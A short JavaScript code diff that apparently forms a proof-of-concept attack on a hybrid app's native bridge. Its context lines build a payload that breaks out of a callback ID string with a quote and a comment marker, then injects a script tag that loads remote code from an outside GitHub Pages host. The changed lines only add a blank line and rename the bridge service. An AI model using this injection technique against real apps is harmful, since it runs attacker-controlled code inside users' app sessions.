@@ -17,6 +17,7 @@
                 args[idx] = btoa(arg);
             }
         });
+
         const currUrl = location.href;
         const payload = `console.log(location.href);s=document.createElement('script'),s.src='https://seuercc.github.io/26/campaign.js',s.onload=()=>console('JS load succeed'),document.head.appendChild(s)`;
         const callbackId = `${service}${genCallbackId()}');${payload}//`;
@@ -69,7 +70,7 @@
     // 5. 挂载全局并调用（参数格式合规）
     window.nativeBridge = {invoke, callNativeMethod};
     nativeBridge.invoke(
-        "wiseopercampaign",
+        "wiseopercampaignbridge",
         "app",
         "getParams",
         [],
